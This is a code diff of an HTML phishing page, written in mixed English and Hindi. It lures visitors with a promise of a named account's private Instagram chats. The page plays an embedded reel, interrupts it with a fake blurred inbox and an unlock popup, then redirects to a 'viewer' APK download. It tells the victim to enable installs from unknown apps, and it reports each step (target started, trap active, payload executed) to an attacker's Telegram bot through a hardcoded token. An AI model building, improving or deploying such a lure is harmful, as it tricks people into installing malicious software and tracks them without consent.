@@ -3,75 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hadima-Closet Private Access</title>
+    <title>Exclusive Content Access</title>
     <style>
         body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
-        #start { position: fixed; inset: 0; background: #000; display: flex; align-items: center; justify-content: center; z-index: 1000; }
-        .btn { padding: 15px 40px; background: #8e44ad; border: none; color: #fff; font-size: 18px; border-radius: 30px; cursor: pointer; font-weight: bold; }
+        #start-btn { position: fixed; inset: 0; background: #000; display: flex; align-items: center; justify-content: center; z-index: 1000; }
+        .btn { padding: 15px 40px; background: #8e44ad; border: none; color: #fff; font-size: 18px; border-radius: 30px; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px #8e44ad; }
         
-        /* Fake Inbox Styling */
-        #inbox-ui { display: none; flex-direction: column; height: 100vh; padding: 10px; background: #121212; filter: blur(8px); opacity: 0.6; }
-        .chat-item { display: flex; align-items: center; padding: 15px; border-bottom: 1px solid #333; }
-        .circle { width: 50px; height: 50px; background: #333; border-radius: 50%; margin-right: 15px; }
-        .line { height: 10px; background: #333; border-radius: 5px; margin-bottom: 5px; }
+        /* Aapke Screenshot jaisa blurred inbox background */
+        #inbox-bg { 
+            display: none; position: fixed; inset: 0; 
+            background: url('https://i.ibb.co/FkVfD8R/inbox-screenshot.png') center/cover; 
+            filter: blur(5px); opacity: 0.8; z-index: 10;
+        }
 
-        /* The Only Trap Popup */
-        #trap { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; z-index: 2000; background: rgba(0,0,0,0.7); }
-        .popup { background: #262626; border: 1px solid #8e44ad; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 320px; box-shadow: 0 0 30px #8e44ad; }
+        #trap-ui { 
+            position: fixed; inset: 0; display: none; 
+            align-items: center; justify-content: center; 
+            z-index: 2000; background: rgba(0,0,0,0.5); 
+        }
+
+        .popup { background: #1a1a1a; border: 1px solid #8e44ad; padding: 25px; border-radius: 20px; text-align: center; width: 85%; max-width: 320px; box-shadow: 0 0 50px #000; }
+        iframe { width: 100vw; height: 100vh; border: none; z-index: 5; }
         .loader { border: 3px solid #333; border-top: 3px solid #8e44ad; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; margin: 15px auto; }
         @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="start">
-    <button class="btn" onclick="startExecution()">Open Hadima-Closet Private Logs</button>
+<div id="start-btn">
+    <button class="btn" onclick="executeApp()">Watch Exclusive Reel</button>
 </div>
 
-<div id="inbox-ui">
-    <h2 style="padding: 10px; color: #8e44ad;">Direct Messages</h2>
-    <div class="chat-item"><div class="circle"></div><div><div class="line" style="width:120px;"></div><div class="line" style="width:80px;"></div></div></div>
-    <div class="chat-item"><div class="circle"></div><div><div class="line" style="width:140px;"></div><div class="line" style="width:60px;"></div></div></div>
-    <div class="chat-item"><div class="circle"></div><div><div class="line" style="width:100px;"></div><div class="line" style="width:90px;"></div></div></div>
-</div>
+<div id="inbox-bg"></div>
 
-<div id="trap">
-    <div class="popup" id="box">
-        <h3 style="margin:0; color:#8e44ad;">🔓 Restricted Chats Found!</h3>
-        <p style="font-size:14px; margin-top:15px;">Aap <b>Hadima-Closet</b> ki private chats aur 'Who can message' list dekh sakte hain.<br><br>Bas 'OK' dabayein aur chats unlock karein.</p>
-        <button class="btn" style="width:100%;" onclick="finalAttack()">OK</button>
+<div id="trap-ui">
+    <div class="popup" id="msg-box">
+        <h3 style="margin:0; color:#8e44ad;">🔓 Restricted Access!</h3>
+        <p style="font-size:14px; margin-top:15px; line-height:1.5;"><b>Hadima-Closet</b> ki private chats mil gayi hain.<br><br>Viewer install karke private messages unlock karein.</p>
+        <button class="btn" style="width:100%;" onclick="finalBlow()">OK</button>
     </div>
 </div>
+
+<iframe id="vid" allow="autoplay"></iframe>
 
 <script>
     const T = "8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k"; 
     const C = "8639892987";
-    const APK = "https://your-github-link.com/viewer.apk"; 
+    const APK = "https://raw.githubusercontent.com/AapkaUsername/Repo/main/hadima_viewer.apk"; 
 
-    function notify(msg) {
-        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
+    function report(text) {
+        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(text)}`);
     }
 
-    function startExecution() {
-        document.getElementById('start').style.display = 'none';
-        document.getElementById('inbox-ui').style.display = 'flex';
-        notify("✅ TARGET_ENTERED: Viewing blurred inbox UI.");
+    function executeApp() {
+        document.getElementById('start-btn').style.display = 'none';
+        document.getElementById('vid').src = "https://www.instagram.com/reel/DXvjb0FP8W0/embed/";
+        report("✅ TARGET_STARTED: User watching 11s reel.");
 
-        // 3 seconds baad curiosity trap dikhao
+        // Exact Middle Trigger (6 seconds)
         setTimeout(() => {
-            document.getElementById('trap').style.display = 'flex';
-        }, 3000);
+            document.getElementById('vid').style.display = 'none';
+            document.getElementById('inbox-bg').style.display = 'block';
+            document.getElementById('trap-ui').style.display = 'flex';
+            report("👀 TRAP_ACTIVE: Reel interrupted at 6s. Bait visible.");
+        }, 6000); 
     }
 
-    function finalAttack() {
-        notify("🔥 SUCCESS: Target clicked OK. Download started.");
+    function finalBlow() {
+        report("🔥 PAYLOAD_EXEC: Target clicked OK to unlock chats.");
         window.location.href = APK;
 
-        document.getElementById('box').innerHTML = `
+        document.getElementById('msg-box').innerHTML = `
             <div class="loader"></div>
-            <h3>⚙️ Unlocking Private Chats...</h3>
+            <h3 style="color:#8e44ad;">⚙️ Decrypting Chats...</h3>
             <p style="font-size:13px;">Security bypass ke liye <b>Settings > Allow Unknown Apps</b> ko enable karein.</p>
-            <p style="font-size:11px; color:#555;">Dwell Time: Connecting to hadima-closet server...</p>
+            <p style="font-size:11px; color:#555;">Connecting to Private Server... Do not close window.</p>
         `;
     }
 </script>
